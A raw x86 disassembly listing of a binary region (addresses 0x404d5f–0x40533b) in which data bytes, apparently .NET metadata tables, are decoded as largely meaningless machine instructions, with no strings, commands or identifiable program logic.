  404d5f:	00 91 18 e1 11 bc    	add    %dl,-0x43ee1ee8(%ecx)
  404d65:	01 26                	add    %esp,(%esi)
  404d67:	00 d8                	add    %bl,%al
  404d69:	39 00                	cmp    %eax,(%eax)
  404d6b:	00 00                	add    %al,(%eax)
  404d6d:	00 96 00 51 02 a5    	add    %dl,-0x5afdaf00(%esi)
  404d73:	01 26                	add    %esp,(%esi)
  404d75:	00 40 3c             	add    %al,0x3c(%eax)
  404d78:	00 00                	add    %al,(%eax)
  404d7a:	00 00                	add    %al,(%eax)
  404d7c:	91                   	xchg   %eax,%ecx
  404d7d:	00 96 04 6c 06 27    	add    %dl,0x27066c04(%esi)
  404d83:	00 68 3d             	add    %ch,0x3d(%eax)
  404d86:	00 00                	add    %al,(%eax)
  404d88:	00 00                	add    %al,(%eax)
  404d8a:	91                   	xchg   %eax,%ecx
  404d8b:	00 a2 02 bc 01 28    	add    %ah,0x2801bc02(%edx)
  404d91:	00 ac 3d 00 00 00 00 	add    %ch,0x0(%ebp,%edi,1)
  404d98:	96                   	xchg   %eax,%esi
  404d99:	00 a2 11 e3 00 28    	add    %ah,0x2800e311(%edx)
  404d9f:	00 f4                	add    %dh,%ah
  404da1:	3d 00 00 00 00       	cmp    $0x0,%eax
  404da6:	91                   	xchg   %eax,%ecx
  404da7:	18 e1                	sbb    %ah,%cl
  404da9:	11 bc 01 29 00 00 3e 	adc    %edi,0x3e000029(%ecx,%eax,1)
  404db0:	00 00                	add    %al,(%eax)
  404db2:	00 00                	add    %al,(%eax)
  404db4:	86 18                	xchg   %bl,(%eax)
  404db6:	db 11                	fistl  (%ecx)
  404db8:	10 00                	adc    %al,(%eax)
  404dba:	29 00                	sub    %eax,(%eax)
  404dbc:	78 3e                	js     0x404dfc
  404dbe:	00 00                	add    %al,(%eax)
  404dc0:	00 00                	add    %al,(%eax)
  404dc2:	86 00                	xchg   %al,(%eax)
  404dc4:	03 17                	add    (%edi),%edx
  404dc6:	ce                   	into
  404dc7:	00 2a                	add    %ch,(%edx)
  404dc9:	00 a0 3e 00 00 00    	add    %ah,0x3e(%eax)
  404dcf:	00 86 00 03 17 a3    	add    %al,-0x5ce8fd00(%esi)
  404dd5:	02 2b                	add    (%ebx),%ch
  404dd7:	00 08                	add    %cl,(%eax)
  404dd9:	40                   	inc    %eax
  404dda:	00 00                	add    %al,(%eax)
  404ddc:	00 00                	add    %al,(%eax)
  404dde:	86 00                	xchg   %al,(%eax)
  404de0:	fb                   	sti
  404de1:	16                   	push   %ss
  404de2:	ce                   	into
  404de3:	00 2c 00             	add    %ch,(%eax,%eax,1)
  404de6:	30 40 00             	xor    %al,0x0(%eax)
  404de9:	00 00                	add    %al,(%eax)
  404deb:	00 86 00 fb 16 a3    	add    %al,-0x5ce90500(%esi)
  404df1:	02 2d 00 f8 41 00    	add    0x41f800,%ch
  404df7:	00 48 00             	add    %cl,0x0(%eax)
  404dfa:	81 00 cb 0c 73 06    	addl   $0x6730ccb,(%eax)
  404e00:	2e 00 34 42          	add    %dh,%cs:(%edx,%eax,2)
  404e04:	00 00                	add    %al,(%eax)
  404e06:	00 00                	add    %al,(%eax)
  404e08:	91                   	xchg   %eax,%ecx
  404e09:	18 e1                	sbb    %ah,%cl
  404e0b:	11 bc 01 30 00 50 42 	adc    %edi,0x42500030(%ecx,%eax,1)
  404e12:	00 00                	add    %al,(%eax)
  404e14:	00 00                	add    %al,(%eax)
  404e16:	96                   	xchg   %eax,%esi
  404e17:	00 2f                	add    %ch,(%edi)
  404e19:	0b 5d 00             	or     0x0(%ebp),%ebx
  404e1c:	30 00                	xor    %al,(%eax)
  404e1e:	dc 42 00             	faddl  0x0(%edx)
  404e21:	00 00                	add    %al,(%eax)
  404e23:	00 96 00 2f 0b f7    	add    %dl,-0x8f4d100(%esi)
  404e29:	03 31                	add    (%ecx),%esi
  404e2b:	00 00                	add    %al,(%eax)
  404e2d:	00 01                	add    %al,(%ecx)
  404e2f:	00 2a                	add    %ch,(%edx)
  404e31:	09 00                	or     %eax,(%eax)
  404e33:	00 01                	add    %al,(%ecx)
  404e35:	00 2a                	add    %ch,(%edx)
  404e37:	09 00                	or     %eax,(%eax)
  404e39:	00 01                	add    %al,(%ecx)
  404e3b:	00 2a                	add    %ch,(%edx)
  404e3d:	09 00                	or     %eax,(%eax)
  404e3f:	00 01                	add    %al,(%ecx)
  404e41:	00 2a                	add    %ch,(%edx)
  404e43:	09 00                	or     %eax,(%eax)
  404e45:	00 01                	add    %al,(%ecx)
  404e47:	00 2a                	add    %ch,(%edx)
  404e49:	09 00                	or     %eax,(%eax)
  404e4b:	00 01                	add    %al,(%ecx)
  404e4d:	00 2a                	add    %ch,(%edx)
  404e4f:	09 00                	or     %eax,(%eax)
  404e51:	00 01                	add    %al,(%ecx)
  404e53:	00 2a                	add    %ch,(%edx)
  404e55:	09 00                	or     %eax,(%eax)
  404e57:	00 01                	add    %al,(%ecx)
  404e59:	00 2a                	add    %ch,(%edx)
  404e5b:	09 00                	or     %eax,(%eax)
  404e5d:	00 01                	add    %al,(%ecx)
  404e5f:	00 2a                	add    %ch,(%edx)
  404e61:	09 00                	or     %eax,(%eax)
  404e63:	00 01                	add    %al,(%ecx)
  404e65:	00 2a                	add    %ch,(%edx)
  404e67:	09 00                	or     %eax,(%eax)
  404e69:	00 01                	add    %al,(%ecx)
  404e6b:	00 33                	add    %dh,(%ebx)
  404e6d:	06                   	push   %es
  404e6e:	00 00                	add    %al,(%eax)
  404e70:	01 00                	add    %eax,(%eax)
  404e72:	8f                   	(bad)
  404e73:	10 00                	adc    %al,(%eax)
  404e75:	00 02                	add    %al,(%edx)
  404e77:	00 0e                	add    %cl,(%esi)
  404e79:	07                   	pop    %es
  404e7a:	00 00                	add    %al,(%eax)
  404e7c:	03 00                	add    (%eax),%eax
  404e7e:	23 0e                	and    (%esi),%ecx
  404e80:	00 00                	add    %al,(%eax)
  404e82:	04 00                	add    $0x0,%al
  404e84:	73 14                	jae    0x404e9a
  404e86:	00 00                	add    %al,(%eax)
  404e88:	01 00                	add    %eax,(%eax)
  404e8a:	0f 10 00             	movups (%eax),%xmm0
  404e8d:	00 01                	add    %al,(%ecx)
  404e8f:	00 25 0b 00 00 01    	add    %ah,0x100000b
  404e95:	00 b9 0b 00 00 01    	add    %bh,0x100000b(%ecx)
  404e9b:	00 b9 0b 00 00 01    	add    %bh,0x100000b(%ecx)
  404ea1:	00 3b                	add    %bh,(%ebx)
  404ea3:	0b 00                	or     (%eax),%eax
  404ea5:	00 01                	add    %al,(%ecx)
  404ea7:	00 11                	add    %dl,(%ecx)
  404ea9:	15 00 00 01 00       	adc    $0x10000,%eax
  404eae:	db 03                	fildl  (%ebx)
  404eb0:	00 00                	add    %al,(%eax)
  404eb2:	02 00                	add    (%eax),%al
  404eb4:	65 17                	gs pop %ss
  404eb6:	00 00                	add    %al,(%eax)
  404eb8:	03 00                	add    (%eax),%eax
  404eba:	e9 16 00 00 01       	jmp    0x1404ed5
  404ebf:	00 cd                	add    %cl,%ch
  404ec1:	05 00 00 01 00       	add    $0x10000,%eax
  404ec6:	83 14 00 00          	adcl   $0x0,(%eax,%eax,1)
  404eca:	02 00                	add    (%eax),%al
  404ecc:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404ecd:	16                   	push   %ss
  404ece:	00 00                	add    %al,(%eax)
  404ed0:	01 00                	add    %eax,(%eax)
  404ed2:	86 13                	xchg   %dl,(%ebx)
  404ed4:	00 00                	add    %al,(%eax)
  404ed6:	01 00                	add    %eax,(%eax)
  404ed8:	35 00 00 00 02       	xor    $0x2000000,%eax
  404edd:	00 88 00 00 00 03    	add    %cl,0x3000000(%eax)
  404ee3:	00 8b 00 00 00 01    	add    %cl,0x1000000(%ebx)
  404ee9:	00 8f 10 00 00 02    	add    %cl,0x2000010(%edi)
  404eef:	00 cd                	add    %cl,%ch
  404ef1:	09 00                	or     %eax,(%eax)
  404ef3:	00 01                	add    %al,(%ecx)
  404ef5:	00 33                	add    %dh,(%ebx)
  404ef7:	06                   	push   %es
  404ef8:	00 00                	add    %al,(%eax)
  404efa:	02 00                	add    (%eax),%al
  404efc:	2a 09                	sub    (%ecx),%cl
  404efe:	00 00                	add    %al,(%eax)
  404f00:	01 00                	add    %eax,(%eax)
  404f02:	2a 09                	sub    (%ecx),%cl
  404f04:	00 00                	add    %al,(%eax)
  404f06:	01 00                	add    %eax,(%eax)
  404f08:	33 06                	xor    (%esi),%eax
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	01 00                	add    %eax,(%eax)
  404f0e:	e9 01 00 00 01       	jmp    0x1404f14
  404f13:	00 20                	add    %ah,(%eax)
  404f15:	0c 00                	or     $0x0,%al
  404f17:	00 01                	add    %al,(%ecx)
  404f19:	00 a5 17 00 00 01    	add    %ah,0x1000017(%ebp)
  404f1f:	00 12                	add    %dl,(%edx)
  404f21:	18 00                	sbb    %al,(%eax)
  404f23:	00 01                	add    %al,(%ecx)
  404f25:	00 3c 17             	add    %bh,(%edi,%edx,1)
  404f28:	00 00                	add    %al,(%eax)
  404f2a:	01 00                	add    %eax,(%eax)
  404f2c:	3c 17                	cmp    $0x17,%al
  404f2e:	00 00                	add    %al,(%eax)
  404f30:	01 00                	add    %eax,(%eax)
  404f32:	3c 17                	cmp    $0x17,%al
  404f34:	00 00                	add    %al,(%eax)
  404f36:	01 00                	add    %eax,(%eax)
  404f38:	3c 17                	cmp    $0x17,%al
  404f3a:	00 00                	add    %al,(%eax)
  404f3c:	01 00                	add    %eax,(%eax)
  404f3e:	32 00                	xor    (%eax),%al
  404f40:	00 00                	add    %al,(%eax)
  404f42:	02 00                	add    (%eax),%al
  404f44:	74 00                	je     0x404f46
  404f46:	00 00                	add    %al,(%eax)
  404f48:	01 00                	add    %eax,(%eax)
  404f4a:	3c 17                	cmp    $0x17,%al
  404f4c:	00 00                	add    %al,(%eax)
  404f4e:	01 00                	add    %eax,(%eax)
  404f50:	3c 17                	cmp    $0x17,%al
  404f52:	09 00                	or     %eax,(%eax)
  404f54:	db 11                	fistl  (%ecx)
  404f56:	01 00                	add    %eax,(%eax)
  404f58:	11 00                	adc    %eax,(%eax)
  404f5a:	db 11                	fistl  (%ecx)
  404f5c:	06                   	push   %es
  404f5d:	00 19                	add    %bl,(%ecx)
  404f5f:	00 db                	add    %bl,%bl
  404f61:	11 0a                	adc    %ecx,(%edx)
  404f63:	00 29                	add    %ch,(%ecx)
  404f65:	00 db                	add    %bl,%bl
  404f67:	11 10                	adc    %edx,(%eax)
  404f69:	00 31                	add    %dh,(%ecx)
  404f6b:	00 db                	add    %bl,%bl
  404f6d:	11 10                	adc    %edx,(%eax)
  404f6f:	00 39                	add    %bh,(%ecx)
  404f71:	00 db                	add    %bl,%bl
  404f73:	11 10                	adc    %edx,(%eax)
  404f75:	00 41 00             	add    %al,0x0(%ecx)
  404f78:	db 11                	fistl  (%ecx)
  404f7a:	10 00                	adc    %al,(%eax)
  404f7c:	49                   	dec    %ecx
  404f7d:	00 db                	add    %bl,%bl
  404f7f:	11 10                	adc    %edx,(%eax)
  404f81:	00 51 00             	add    %dl,0x0(%ecx)
  404f84:	db 11                	fistl  (%ecx)
  404f86:	10 00                	adc    %al,(%eax)
  404f88:	59                   	pop    %ecx
  404f89:	00 db                	add    %bl,%bl
  404f8b:	11 10                	adc    %edx,(%eax)
  404f8d:	00 61 00             	add    %ah,0x0(%ecx)
  404f90:	db 11                	fistl  (%ecx)
  404f92:	15 00 69 00 db       	adc    $0xdb006900,%eax
  404f97:	11 10                	adc    %edx,(%eax)
  404f99:	00 71 00             	add    %dh,0x0(%ecx)
  404f9c:	db 11                	fistl  (%ecx)
  404f9e:	10 00                	adc    %al,(%eax)
  404fa0:	99                   	cltd
  404fa1:	00 db                	add    %bl,%bl
  404fa3:	11 06                	adc    %eax,(%esi)
  404fa5:	00 a9 00 db 11 1a    	add    %ch,0x1a11db00(%ecx)
  404fab:	00 01                	add    %al,(%ecx)
  404fad:	01 c7                	add    %eax,%edi
  404faf:	0f 2c 00             	cvttps2pi (%eax),%mm0
  404fb2:	11 02                	adc    %eax,(%edx)
  404fb4:	65 00 31             	add    %dh,%gs:(%ecx)
  404fb7:	00 19                	add    %bl,(%ecx)
  404fb9:	02 c7                	add    %bh,%al
  404fbb:	15 2c 00 11 02       	adc    $0x211002c,%eax
  404fc0:	02 0e                	add    (%esi),%cl
  404fc2:	36 00 79 00          	add    %bh,%ss:0x0(%ecx)
  404fc6:	db 11                	fistl  (%ecx)
  404fc8:	06                   	push   %es
  404fc9:	00 81 00 fb 17 45    	add    %al,0x4517fb00(%ecx)
  404fcf:	00 21                	add    %ah,(%ecx)
  404fd1:	02 c6                	add    %dh,%al
  404fd3:	17                   	pop    %ss
  404fd4:	4b                   	dec    %ebx
  404fd5:	00 31                	add    %dh,(%ecx)
  404fd7:	02 b4 00 51 00 31 02 	add    0x2310051(%eax,%eax,1),%dh
  404fde:	53                   	push   %ebx
  404fdf:	13 57 00             	adc    0x0(%edi),%edx
  404fe2:	39 02                	cmp    %eax,(%edx)
  404fe4:	50                   	push   %eax
  404fe5:	01 5d 00             	add    %ebx,0x0(%ebp)
  404fe8:	11 02                	adc    %eax,(%edx)
  404fea:	72 0a                	jb     0x404ff6
  404fec:	62 00                	bound  %eax,(%eax)
  404fee:	89 00                	mov    %eax,(%eax)
  404ff0:	4d                   	dec    %ebp
  404ff1:	0b 68 00             	or     0x0(%eax),%ebp
  404ff4:	b1 00                	mov    $0x0,%cl
  404ff6:	db 11                	fistl  (%ecx)
  404ff8:	8a 00                	mov    (%eax),%al
  404ffa:	b1 00                	mov    $0x0,%cl
  404ffc:	ad                   	lods   %ds:(%esi),%eax
  404ffd:	09 01                	or     %eax,(%ecx)
  404fff:	00 b1 00 9a 09 01    	add    %dh,0x1099a00(%ecx)
  405005:	00 59 02             	add    %bl,0x2(%ecx)
  405008:	8b 18                	mov    (%eax),%ebx
  40500a:	97                   	xchg   %eax,%edi
  40500b:	00 59 02             	add    %bl,0x2(%ecx)
  40500e:	b9 15 9d 00 69       	mov    $0x69009d15,%ecx
  405013:	02 db                	add    %bl,%bl
  405015:	11 06                	adc    %eax,(%esi)
  405017:	00 69 02             	add    %ch,0x2(%ecx)
  40501a:	46                   	inc    %esi
  40501b:	17                   	pop    %ss
  40501c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40501d:	00 71 02             	add    %dh,0x2(%ecx)
  405020:	cc                   	int3
  405021:	12 a9 00 b1 00 45    	adc    0x4500b100(%ecx),%ch
  405027:	15 b0 00 b1 00       	adc    $0xb100b0,%eax
  40502c:	74 02                	je     0x405030
  40502e:	b7 00                	mov    $0x0,%bh
  405030:	b1 00                	mov    $0x0,%cl
  405032:	45                   	inc    %ebp
  405033:	15 bb 00 d1 00       	adc    $0xd100bb,%eax
  405038:	db 11                	fistl  (%ecx)
  40503a:	06                   	push   %es
  40503b:	00 d9                	add    %bl,%cl
  40503d:	00 db                	add    %bl,%bl
  40503f:	11 c1                	adc    %eax,%ecx
  405041:	00 d1                	add    %dl,%cl
  405043:	00 f1                	add    %dh,%cl
  405045:	13 c7                	adc    %edi,%eax
  405047:	00 d1                	add    %dl,%cl
  405049:	00 92 0a ce 00 59    	add    %dl,0x5900ce0a(%edx)
  40504f:	02 b9 15 d3 00 69    	add    0x6900d315(%ecx),%bh
  405055:	02 46 17             	add    0x17(%esi),%al
  405058:	dd 00                	fldl   (%eax)
  40505a:	89 02                	mov    %eax,(%edx)
  40505c:	d1 06                	roll   $1,(%esi)
  40505e:	06                   	push   %es
  40505f:	00 91 02 63 06 e3    	add    %dl,-0x1cf99cfe(%ecx)
  405065:	00 99 02 db 11 e8    	add    %bl,-0x17ee24fe(%ecx)
  40506b:	00 a1 02 db 11 ef    	add    %ah,-0x10ee24fe(%ecx)
  405071:	00 b9 00 db 11 f5    	add    %bh,-0xaee2500(%ecx)
  405077:	00 b1 00 b9 16 00    	add    %dh,0x16b900(%ecx)
  40507d:	01 79 00             	add    %edi,0x0(%ecx)
  405080:	a1 0a 06 01 b9       	mov    0xb901060a,%eax
  405085:	00 42 16             	add    %al,0x16(%edx)
  405088:	0a 01                	or     (%ecx),%al
  40508a:	d1 02                	roll   $1,(%edx)
  40508c:	db 11                	fistl  (%ecx)
  40508e:	ef                   	out    %eax,(%dx)
  40508f:	00 c1                	add    %al,%cl
  405091:	00 db                	add    %bl,%bl
  405093:	11 16                	adc    %edx,(%esi)
  405095:	01 d9                	add    %ebx,%ecx
  405097:	02 db                	add    %bl,%bl
  405099:	11 ef                	adc    %ebp,%edi
  40509b:	00 a9 02 4c 02 20    	add    %ch,0x20024c02(%ecx)
  4050a1:	01 e1                	add    %esp,%ecx
  4050a3:	02 25 06 2d 01 a9    	add    0xa9012d06,%ah
  4050a9:	02 d1                	add    %cl,%dl
  4050ab:	06                   	push   %es
  4050ac:	06                   	push   %es
  4050ad:	00 b1 00 d1 06 06    	add    %dh,0x606d100(%ecx)
  4050b3:	00 c1                	add    %al,%cl
  4050b5:	00 d1                	add    %dl,%cl
  4050b7:	06                   	push   %es
  4050b8:	06                   	push   %es
  4050b9:	00 a9 02 44 02 45    	add    %ch,0x45024402(%ecx)
  4050bf:	01 f1                	add    %esi,%ecx
  4050c1:	02 65 00             	add    0x0(%ebp),%ah
  4050c4:	4b                   	dec    %ebx
  4050c5:	01 f9                	add    %edi,%ecx
  4050c7:	02 a1 0a 06 01 59    	add    0x5901060a(%ecx),%ah
  4050cd:	02 fe                	add    %dh,%bh
  4050cf:	14 52                	adc    $0x52,%al
  4050d1:	01 a9 02 51 02 59    	add    %ebp,0x59025102(%ecx)
  4050d7:	01 01                	add    %eax,(%ecx)
  4050d9:	03 db                	add    %ebx,%ebx
  4050db:	11 ef                	adc    %ebp,%edi
  4050dd:	00 01                	add    %al,(%ecx)
  4050df:	01 db                	add    %ebx,%ebx
  4050e1:	11 61 01             	adc    %esp,0x1(%ecx)
  4050e4:	01 01                	add    %eax,(%ecx)
  4050e6:	1e                   	push   %ds
  4050e7:	17                   	pop    %ss
  4050e8:	68 01 09 03 87       	push   $0x87030901
  4050ed:	11 7d 01             	adc    %edi,0x1(%ebp)
  4050f0:	f1                   	int1
  4050f1:	02 53 13             	add    0x13(%ebx),%dl
  4050f4:	84 01                	test   %al,(%ecx)
  4050f6:	b1 00                	mov    $0x0,%cl
  4050f8:	24 0d                	and    $0xd,%al
  4050fa:	8a 01                	mov    (%ecx),%al
  4050fc:	a9 02 60 07 92       	test   $0x92076002,%eax
  405101:	01 09                	add    %ecx,(%ecx)
  405103:	01 db                	add    %ebx,%ebx
  405105:	11 9a 01 a9 02 09    	adc    %ebx,0x902a901(%edx)
  40510b:	0f a0                	push   %fs
  40510d:	01 a9 02 58 0b 06    	add    %ebp,0x60b5802(%ecx)
  405113:	00 09                	add    %cl,(%ecx)
  405115:	03 c7                	add    %edi,%eax
  405117:	15 a5 01 11 01       	adc    $0x11101a5,%eax
  40511c:	db 11                	fistl  (%ecx)
  40511e:	06                   	push   %es
  40511f:	00 11                	add    %dl,(%ecx)
  405121:	01 2d 15 b0 01 11    	add    %ebp,0x1101b015
  405127:	01 b7 0a 10 00 11    	add    %esi,0x1100100a(%edi)
  40512d:	01 0b                	add    %ecx,(%ebx)
  40512f:	13 b7 01 19 03 3d    	adc    0x3d031901(%edi),%esi
  405135:	15 bc 01 19 02       	adc    $0x21901bc,%eax
  40513a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40513b:	12 5d 00             	adc    0x0(%ebp),%bl
  40513e:	21 03                	and    %eax,(%ebx)
  405140:	6d                   	insl   (%dx),%es:(%edi)
  405141:	06                   	push   %es
  405142:	e4 01                	in     $0x1,%al
  405144:	19 01                	sbb    %eax,(%ecx)
  405146:	db 11                	fistl  (%ecx)
  405148:	10 00                	adc    %al,(%eax)
  40514a:	29 01                	sub    %eax,(%ecx)
  40514c:	8c 14 ea             	mov    %ss,(%edx,%ebp,8)
  40514f:	01 29                	add    %ebp,(%ecx)
  405151:	01 4e 05             	add    %ecx,0x5(%esi)
  405154:	f0 01 29             	lock add %ebp,(%ecx)
  405157:	03 97 05 06 01 31    	add    0x31010605(%edi),%edx
  40515d:	03 f9                	add    %ecx,%edi
  40515f:	05 06 01 59 02       	add    $0x2590106,%eax
  405164:	97                   	xchg   %eax,%edi
  405165:	18 97 00 29 01 bf    	sbb    %dl,-0x40fed700(%edi)
  40516b:	12 f6                	adc    %dh,%dh
  40516d:	01 29                	add    %ebp,(%ecx)
  40516f:	01 1f                	add    %ebx,(%edi)
  405171:	0d 06 00 31 01       	or     $0x1310006,%eax
  405176:	db 11                	fistl  (%ecx)
  405178:	06                   	push   %es
  405179:	00 31                	add    %dh,(%ecx)
  40517b:	01 a4 05 10 00 31 03 	add    %esp,0x3310010(%ebp,%eax,1)
  405182:	8e 05 06 01 21 03    	mov    0x3210106,%es
  405188:	5b                   	pop    %ebx
  405189:	0e                   	push   %cs
  40518a:	5d                   	pop    %ebp
  40518b:	00 59 02             	add    %bl,0x2(%ecx)
  40518e:	fe                   	(bad)
  40518f:	14 fd                	adc    $0xfd,%al
  405191:	01 31                	add    %esi,(%ecx)
  405193:	01 c6                	add    %eax,%esi
  405195:	14 10                	adc    $0x10,%al
  405197:	00 31                	add    %dh,(%ecx)
  405199:	01 6b 05             	add    %ebp,0x5(%ebx)
  40519c:	03 02                	add    (%edx),%eax
  40519e:	31 01                	xor    %eax,(%ecx)
  4051a0:	7e 17                	jle    0x4051b9
  4051a2:	15 00 29 01 1e       	adc    $0x1e012900,%eax
  4051a7:	17                   	pop    %ss
  4051a8:	0a 02                	or     (%edx),%al
  4051aa:	41                   	inc    %ecx
  4051ab:	03 63 11             	add    0x11(%ebx),%esp
  4051ae:	13 02                	adc    (%edx),%eax
  4051b0:	49                   	dec    %ecx
  4051b1:	03 d9                	add    %ecx,%ebx
  4051b3:	06                   	push   %es
  4051b4:	5d                   	pop    %ebp
  4051b5:	00 39                	add    %bh,(%ecx)
  4051b7:	01 f0                	add    %esi,%eax
  4051b9:	17                   	pop    %ss
  4051ba:	18 02                	sbb    %al,(%edx)
  4051bc:	39 01                	cmp    %eax,(%ecx)
  4051be:	21 09                	and    %ecx,(%ecx)
  4051c0:	22 02                	and    (%edx),%al
  4051c2:	59                   	pop    %ecx
  4051c3:	03 e7                	add    %edi,%esp
  4051c5:	14 36                	adc    $0x36,%al
  4051c7:	00 59 03             	add    %bl,0x3(%ecx)
  4051ca:	50                   	push   %eax
  4051cb:	07                   	pop    %es
  4051cc:	e3 00                	jecxz  0x4051ce
  4051ce:	21 01                	and    %eax,(%ecx)
  4051d0:	db 11                	fistl  (%ecx)
  4051d2:	28 02                	sub    %al,(%edx)
  4051d4:	59                   	pop    %ecx
  4051d5:	03 2b                	add    (%ebx),%ebp
  4051d7:	13 62 00             	adc    0x0(%edx),%esp
  4051da:	21 03                	and    %eax,(%ebx)
  4051dc:	b1 05                	mov    $0x5,%cl
  4051de:	30 02                	xor    %al,(%edx)
  4051e0:	59                   	pop    %ecx
  4051e1:	02 fe                	add    %dh,%bh
  4051e3:	14 e4                	adc    $0xe4,%al
  4051e5:	01 41 01             	add    %eax,0x1(%ecx)
  4051e8:	db 11                	fistl  (%ecx)
  4051ea:	10 00                	adc    %al,(%eax)
  4051ec:	69 03 63 06 10 00    	imul   $0x100663,(%ebx),%eax
  4051f2:	21 03                	and    %eax,(%ebx)
  4051f4:	71 0b                	jno    0x405201
  4051f6:	30 02                	xor    %al,(%edx)
  4051f8:	21 03                	and    %eax,(%ebx)
  4051fa:	c1 05 5d 00 31 01 15 	roll   $0x15,0x131005d
  405201:	0b 15 00 31 01 f3    	or     0xf3013100,%edx
  405207:	08 15 00 91 00 7a    	or     %dl,0x7a009100
  40520d:	04 06                	add    $0x6,%al
  40520f:	01 19                	add    %ebx,(%ecx)
  405211:	02 2c 17             	add    (%edi,%edx,1),%ch
  405214:	e3 00                	jecxz  0x405216
  405216:	19 02                	sbb    %eax,(%edx)
  405218:	6b 18 30             	imul   $0x30,(%eax),%ebx
  40521b:	02 21                	add    (%ecx),%ah
  40521d:	03 ef                	add    %edi,%ebp
  40521f:	16                   	push   %ss
  405220:	5d                   	pop    %ebp
  405221:	00 71 03             	add    %dh,0x3(%ecx)
  405224:	db 11                	fistl  (%ecx)
  405226:	10 00                	adc    %al,(%eax)
  405228:	71 03                	jno    0x40522d
  40522a:	6e                   	outsb  %ds:(%esi),(%dx)
  40522b:	09 3a                	or     %edi,(%edx)
  40522d:	02 79 03             	add    0x3(%ecx),%bh
  405230:	db 11                	fistl  (%ecx)
  405232:	06                   	push   %es
  405233:	00 79 03             	add    %bh,0x3(%ecx)
  405236:	ea 05 06 01 59 02 9a 	ljmp   $0x9a02,$0x59010605
  40523d:	11 06                	adc    %eax,(%esi)
  40523f:	01 59 02             	add    %ebx,0x2(%ecx)
  405242:	27                   	daa
  405243:	14 43                	adc    $0x43,%al
  405245:	02 49 01             	add    0x1(%ecx),%cl
  405248:	db 11                	fistl  (%ecx)
  40524a:	10 00                	adc    %al,(%eax)
  40524c:	49                   	dec    %ecx
  40524d:	01 57 15             	add    %edx,0x15(%edi)
  405250:	5a                   	pop    %edx
  405251:	02 51 01             	add    0x1(%ecx),%dl
  405254:	c3                   	ret
  405255:	11 60 02             	adc    %esp,0x2(%eax)
  405258:	59                   	pop    %ecx
  405259:	01 75 16             	add    %esi,0x16(%ebp)
  40525c:	66 02 61 01          	data16 add 0x1(%ecx),%ah
  405260:	7b 0d                	jnp    0x40526f
  405262:	6c                   	insb   (%dx),%es:(%edi)
  405263:	02 59 02             	add    0x2(%ecx),%bl
  405266:	de 15 06 01 59 01    	ficoms 0x1590106
  40526c:	42                   	inc    %edx
  40526d:	17                   	pop    %ss
  40526e:	b7 00                	mov    $0x0,%bh
  405270:	29 01                	sub    %eax,(%ecx)
  405272:	b4 04                	mov    $0x4,%ah
  405274:	71 02                	jno    0x405278
  405276:	81 03 65 00 7b 02    	addl   $0x27b0065,(%ebx)
  40527c:	19 02                	sbb    %eax,(%edx)
  40527e:	d6                   	salc
  40527f:	16                   	push   %ss
  405280:	83 02 19             	addl   $0x19,(%edx)
  405283:	02 18                	add    (%eax),%bl
  405285:	06                   	push   %es
  405286:	30 02                	xor    %al,(%edx)
  405288:	19 02                	sbb    %eax,(%edx)
  40528a:	da 05 30 02 19 02    	fiaddl 0x2190230
  405290:	77 0e                	ja     0x4052a0
  405292:	87 02                	xchg   %eax,(%edx)
  405294:	59                   	pop    %ecx
  405295:	02 fe                	add    %dh,%bh
  405297:	14 8d                	adc    $0x8d,%al
  405299:	02 69 01             	add    0x1(%ecx),%ch
  40529c:	db 11                	fistl  (%ecx)
  40529e:	06                   	push   %es
  40529f:	00 31                	add    %dh,(%ecx)
  4052a1:	02 7f 01             	add    0x1(%edi),%bh
  4052a4:	51                   	push   %ecx
  4052a5:	00 99 03 2f 0b a3    	add    %bl,-0x5cf4d0fd(%ecx)
  4052ab:	02 71 01             	add    0x1(%ecx),%dh
  4052ae:	db 11                	fistl  (%ecx)
  4052b0:	06                   	push   %es
  4052b1:	00 c9                	add    %cl,%cl
  4052b3:	02 a1 0a ce 00 71    	add    0x7100ce0a(%ecx),%ah
  4052b9:	01 e5                	add    %esp,%ebp
  4052bb:	03 aa 02 59 02 da    	add    -0x25fda6fe(%edx),%ebp
  4052c1:	0a b1 02 59 02 48    	or     0x48025902(%ecx),%dh
  4052c7:	11 06                	adc    %eax,(%esi)
  4052c9:	01 59 02             	add    %ebx,0x2(%ecx)
  4052cc:	fe 03                	incb   (%ebx)
  4052ce:	c3                   	ret
  4052cf:	02 19                	add    (%ecx),%bl
  4052d1:	02 84 0d c9 02 a1 03 	add    0x3a102c9(%ebp,%ecx,1),%al
  4052d8:	a1 0a 06 01 a9       	mov    0xa901060a,%eax
  4052dd:	03 5e 0b             	add    0xb(%esi),%ebx
  4052e0:	30 02                	xor    %al,(%edx)
  4052e2:	31 03                	xor    %eax,(%ebx)
  4052e4:	41                   	inc    %ecx
  4052e5:	06                   	push   %es
  4052e6:	cd 02                	int    $0x2
  4052e8:	79 01                	jns    0x4052eb
  4052ea:	53                   	push   %ebx
  4052eb:	06                   	push   %es
  4052ec:	cd 02                	int    $0x2
  4052ee:	79 01                	jns    0x4052f1
  4052f0:	a1 0a 06 01 b1       	mov    0xb101060a,%eax
  4052f5:	03 81 16 d3 02 b9    	add    -0x46fd2cea(%ecx),%eax
  4052fb:	03 db                	add    %ebx,%ebx
  4052fd:	11 d9                	adc    %ebx,%ecx
  4052ff:	02 b9 03 1d 05 e0    	add    -0x1ffae2fd(%ecx),%bh
  405305:	02 a9 02 cb 06 06    	add    0x606cb02(%ecx),%ch
  40530b:	00 b1 00 cb 06 06    	add    %dh,0x606cb00(%ecx)
  405311:	00 49 01             	add    %cl,0x1(%ecx)
  405314:	db 11                	fistl  (%ecx)
  405316:	c1 00 0c             	roll   $0xc,(%eax)
  405319:	00 db                	add    %bl,%bl
  40531b:	11 06                	adc    %eax,(%esi)
  40531d:	00 0c 00             	add    %cl,(%eax,%eax,1)
  405320:	62 02                	bound  %eax,(%edx)
  405322:	02 03                	add    (%ebx),%al
  405324:	0c 00                	or     $0x0,%al
  405326:	cc                   	int3
  405327:	16                   	push   %ss
  405328:	7b 02                	jnp    0x40532c
  40532a:	0c 00                	or     $0x0,%al
  40532c:	be 17 08 03 59       	mov    $0x59030817,%esi
  405331:	02 56 0e             	add    0xe(%esi),%dl
  405334:	0e                   	push   %cs
  405335:	03 89 01 43 14 28    	add    0x28144301(%ecx),%ecx
  40533b:	03 89 01 62 01 2f    	add    0x2f016201(%ecx),%ecx
